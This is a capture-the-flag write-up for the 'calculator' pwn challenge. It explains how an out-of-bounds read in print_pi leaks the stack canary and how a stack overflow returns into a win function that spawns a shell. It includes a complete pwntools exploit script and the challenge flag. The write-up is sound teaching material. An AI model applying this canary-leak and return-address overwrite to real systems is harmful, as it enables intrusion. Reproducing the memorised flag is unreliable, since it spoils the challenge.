https://ctftime.org/event/2449

# calculator (pwn)

nc challs.pwnoh.io 13377

## Analysis

We can see that this binary has stack canaries but no PIE:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

`main` @ `0x0040131f`
- Allows us to compute the result of an operation on two operands
- Gives us a stack buffer overflow with `fgets` that allows us to control the return address

`parse_operand` @ `0x004017ec`
- Checks if the user specified `pi` as an operand
- If so it uses `request_pi_precision` to determine the value of pi to use

`request_pi_precision` @ `0x004015e5`
- Asks the user to specify the value that will be passed to `print_pi` as its first argument

`print_pi` @ `0x004016a5`
- `putchar`s bytes from a buffer on the stack
- Uses the function's first arg to determine the offset from the buffer on the stack
- we can specify a precision of more than 10000 in order to read out of bounds
- The `pi` buffer is adjacent to the stack canary
- Therefore specifying a precision of 10016 will cause this function to leak the stack canary

`win` @ `0x004012f6`
- Calls `system("/bin/sh")` for us
- Note that when returning to this function we need to jump to offset 0x17 in order to align the stack correctly for the call to `system`

## Solution

1) Ask the calculator to perform `1 * pi`
2) Specify a number of digits for `pi` such that it leaks the canary on the stack
3) Return to `win` - taking care to use the leaked canary 

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./calc", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript=" b main")
p = remote("challs.pwnoh.io", 13377)

p.sendlineafter(b"operand: ", b"1")
p.sendlineafter(b"operator: ", b"*")
p.sendlineafter(b"operand: ", b"pi")
p.sendlineafter(b" use: ", str("10016").encode())

p.readuntil(b"That is: ")
line = p.readline()
canary = u64(line[-11:-3])

payload = b""
payload += b"A" * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(elf.sym["win"] + 0x17)
p.sendline(payload)

p.readuntil(b"here: ")

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{cAn4r13S_L0v3_t0_34t_P13_c760f8cc0a44fed9}
```

## Flag
`bctf{cAn4r13S_L0v3_t0_34t_P13_c760f8cc0a44fed9}`

smiley 2024/09/29
